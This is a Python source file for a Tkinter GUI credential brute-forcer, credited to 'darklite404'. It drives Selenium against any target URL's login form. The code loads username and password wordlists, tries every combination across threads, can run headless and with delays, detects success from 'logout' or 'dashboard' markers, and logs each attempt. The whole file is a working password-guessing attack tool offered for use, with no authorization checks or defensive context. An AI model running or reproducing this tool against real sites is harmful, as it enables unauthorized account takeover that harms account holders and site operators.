import threading
import tkinter as tk
from tkinter import filedialog, messagebox
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
import time
import os
import json
import webbrowser
from datetime import datetime
from queue import Queue

# Control flags
is_running = False
is_paused = False

# Task management
max_threads = 1

# Config file path
CONFIG_FILE = "settings.json"

# GUI setup
root = tk.Tk()
root.title("Brute Force GUI (Developed by darklite404)")

frame = tk.Frame(root)
frame.pack(padx=10, pady=10)

# Username and password list checkbox toggle
use_username_file_var = tk.BooleanVar(value=False)
use_password_file_var = tk.BooleanVar(value=True)

def toggle_username_input():
    if use_username_file_var.get():
        username_file_entry.config(state="normal")
        username_file_browse.config(state="normal")
        username_entry.config(state="disabled")
    else:
        username_file_entry.config(state="disabled")
        username_file_browse.config(state="disabled")
        username_entry.config(state="normal")                                             
def toggle_password_input():
    if use_password_file_var.get():
        password_file_entry.config(state="normal")
        password_file_browse.config(state="normal")
        static_password_entry.config(state="disabled")
    else:
        password_file_entry.config(state="disabled")
        password_file_browse.config(state="disabled")
        static_password_entry.config(state="normal")

def save_settings():
    settings = {
        "url": url_entry.get(),
        "username": username_entry.get(),
        "username_file": username_file_entry.get(),
        "password_file": password_file_entry.get(),
        "static_password": static_password_entry.get(),
        "threads": thread_count_entry.get(),
        "headless": headless_var.get(),
        "delay": delay_entry.get()
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(settings, f)

def load_settings():
    if os.path.isfile(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            settings = json.load(f)
            url_entry.insert(0, settings.get("url", ""))
            username_entry.insert(0, settings.get("username", ""))
            username_file_entry.insert(0, settings.get("username_file", ""))
            password_file_entry.insert(0, settings.get("password_file", ""))
            static_password_entry.insert(0, settings.get("static_password", ""))
            thread_count_entry.delete(0, tk.END)
            thread_count_entry.insert(0, settings.get("threads", "1"))
            delay_entry.delete(0, tk.END)
            delay_entry.insert(0, settings.get("delay", "1"))
            headless_var.set(settings.get("headless", False))

def clear_settings():
    if os.path.isfile(CONFIG_FILE):
        os.remove(CONFIG_FILE)
        messagebox.showinfo("Settings", "Saved settings deleted.")

def browse_file(entry):
    file_path = filedialog.askopenfilename()
    entry.delete(0, tk.END)
    entry.insert(0, file_path)

def find_login_fields(driver):
    try:
        inputs = driver.find_elements(By.XPATH, '//input')
        username_input, password_input, submit_button = None, None, None
        for input_elem in inputs:
            name = input_elem.get_attribute("name") or ""
            input_type = input_elem.get_attribute("type") or ""
            input_id = input_elem.get_attribute("id") or ""
            if not username_input and input_type in ["text", "email"] and any(k in name.lower() + input_id.lower() for k in ["user", "login", "email"]):
                username_input = input_elem
            if not password_input and input_type == "password":
                password_input = input_elem
            if not submit_button and input_type == "submit":
                submit_button = input_elem
        if not submit_button:
            buttons = driver.find_elements(By.XPATH, '//button[@type="submit"]')
            if buttons:
                submit_button = buttons[0]
        return username_input, password_input, submit_button
    except:
        return None, None, None

def log_to_file(url, username, password, result, response_time):
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_line = f"{now} | {url} | {username} | {password} | {result} | {response_time:.2f}s"
    with open("bruteforce_log.txt", "a") as log_file:
        log_file.write(log_line + "\n")

def brute_force_worker(creds_queue, url, chrome_options):
    service = Service('chromedriver.exe')
    driver = webdriver.Chrome(service=service, options=chrome_options)
    while not creds_queue.empty() and is_running:
        if is_paused:
            time.sleep(0.5)
            continue
        username, pw = creds_queue.get()
        start_time = time.time()
        result = "Failed"
        log(f"Trying: {username}:{pw}")
        driver.get(url)
        time.sleep(2)
        try:
            username_input, password_input, submit_button = find_login_fields(driver)
            if username_input and password_input and submit_button:
                username_input.clear()
                username_input.send_keys(username)
                password_input.clear()
                password_input.send_keys(pw)
                submit_button.click()
                time.sleep(2)
                if "logout" in driver.page_source.lower() or "dashboard" in driver.current_url:
                    result = "Success"
            else:
                result = "Login fields not found"
            if "recaptcha" in driver.page_source.lower():
                result = "CAPTCHA Detected"
                log("⚠️ CAPTCHA detected! Bypassing not supported.")
                break
            if result == "Success":
                log(f"✅ SUCCESS! Password found: {pw}")
                messagebox.showinfo("Success", f"Username: {username}\nPassword: {pw}")
                break
        except Exception as e:
            result = f"Error: {str(e)}"
            log(f"⚠️ Error: {e}")
        response_time = time.time() - start_time
        log_to_file(url, username, pw, result, response_time)
        try:
            time.sleep(float(delay_entry.get()))
        except:
            time.sleep(1)
    driver.quit()

def brute_force():
    global is_running, is_paused
    is_running = True
    is_paused = False
    save_settings()
    url = url_entry.get()
    password_file = password_file_entry.get()
    username_file = username_file_entry.get()
    static_password = static_password_entry.get()
    single_username = username_entry.get()
    creds_queue = Queue()

    if username_file:
        if not os.path.isfile(username_file):
            messagebox.showerror("File Error", "Username file not found.")
            return
        with open(username_file, "r") as f:
            usernames = [line.strip() for line in f if line.strip()]
        if use_password_file_var.get():
            if not os.path.isfile(password_file):
                messagebox.showerror("File Error", "Password file not found.")
                return
            with open(password_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for u in usernames:
                for p in passwords:
                    creds_queue.put((u, p))
        else:
            for u in usernames:
                creds_queue.put((u, static_password))
    else:
        if not single_username:
            messagebox.showerror("Input Error", "Please provide a username or username file.")
            return
        if use_password_file_var.get():
            if not os.path.isfile(password_file):
                messagebox.showerror("File Error", "Password file not found.")
                return
            with open(password_file, "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
            for p in passwords:
                creds_queue.put((single_username, p))
        else:
            creds_queue.put((single_username, static_password))

    chrome_options = Options()
    if headless_var.get():
        chrome_options.add_argument("--headless")
    threads = []
    for _ in range(min(max_threads, creds_queue.qsize())):
        t = threading.Thread(target=brute_force_worker, args=(creds_queue, url, chrome_options))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def start_attack():
    try:
        global max_threads
        max_threads = int(thread_count_entry.get())
        if max_threads < 1:
            raise ValueError
    except ValueError:
        messagebox.showerror("Input Error", "Thread count must be a positive integer.")
        return
    threading.Thread(target=brute_force).start()

def pause_attack():
    global is_paused
    is_paused = not is_paused
    log("⏸️ Paused" if is_paused else "▶️ Resumed")

def stop_attack():
    global is_running
    is_running = False

def log(message):
    output_text.insert(tk.END, message + "\n")
    output_text.see(tk.END)

# URL
tk.Label(frame, text="Target URL:").grid(row=0, column=0, sticky="e")
url_entry = tk.Entry(frame, width=60)
url_entry.grid(row=0, column=1, columnspan=2)

# Username
tk.Label(frame, text="Username:").grid(row=1, column=0, sticky="e")
username_entry = tk.Entry(frame, width=60)
username_entry.grid(row=1, column=1, columnspan=2)

# Username file
tk.Label(frame, text="Use username list:").grid(row=2, column=0, sticky="e")
tk.Checkbutton(frame, variable=use_username_file_var, command=toggle_username_input).grid(row=2, column=1, sticky="w")

username_file_entry = tk.Entry(frame, width=50)
username_file_entry.grid(row=3, column=1)
username_file_browse = tk.Button(frame, text="Browse", command=lambda: browse_file(username_file_entry))
username_file_browse.grid(row=3, column=2)

# Password source selector
tk.Label(frame, text="Use password list:").grid(row=4, column=0, sticky="e")
tk.Checkbutton(frame, variable=use_password_file_var, command=toggle_password_input).grid(row=4, column=1, sticky="w")

# Password file
tk.Label(frame, text="Password file:").grid(row=5, column=0, sticky="e")
password_file_entry = tk.Entry(frame, width=50)
password_file_entry.grid(row=5, column=1)
password_file_browse = tk.Button(frame, text="Browse", command=lambda: browse_file(password_file_entry))
password_file_browse.grid(row=5, column=2)

# Static password
tk.Label(frame, text="Static password:").grid(row=6, column=0, sticky="e")
static_password_entry = tk.Entry(frame, width=60)
static_password_entry.grid(row=6, column=1, columnspan=2)

# Threads
tk.Label(frame, text="Threads (1-10):").grid(row=7, column=0, sticky="e")
thread_count_entry = tk.Entry(frame, width=5)
thread_count_entry.insert(0, "1")
thread_count_entry.grid(row=7, column=1, sticky="w")

# Delay between attempts
tk.Label(frame, text="Delay (sec):").grid(row=8, column=0, sticky="e")
delay_entry = tk.Entry(frame, width=5)
delay_entry.insert(0, "1")
delay_entry.grid(row=8, column=1, sticky="w")

# Headless mode
headless_var = tk.BooleanVar()
tk.Checkbutton(frame, text="Run in headless mode", variable=headless_var).grid(row=8, column=2, sticky="w")

# Controls
tk.Button(frame, text="Start", width=10, command=start_attack).grid(row=9, column=0, pady=10)
tk.Button(frame, text="Pause/Resume", width=15, command=pause_attack).grid(row=9, column=1)
tk.Button(frame, text="Stop", width=10, command=stop_attack).grid(row=9, column=2)
tk.Button(frame, text="Clear Settings", command=clear_settings).grid(row=10, column=1, pady=(0, 10))

# Output box
output_text = tk.Text(root, height=15, width=100)
output_text.pack(padx=10, pady=10)

# Developer credit
credit = tk.Label(root, text="Developed by darklite404", fg="blue", cursor="hand2")
credit.pack(side=tk.LEFT, padx=10, anchor="sw")
credit.bind("<Button-1>", lambda e: webbrowser.open_new("https://github.com/darklite404/Selenium-Brute-Force-GUI"))

# Load saved settings
load_settings()

# Initialize toggle state
toggle_username_input()                       
toggle_password_input()

root.mainloop()
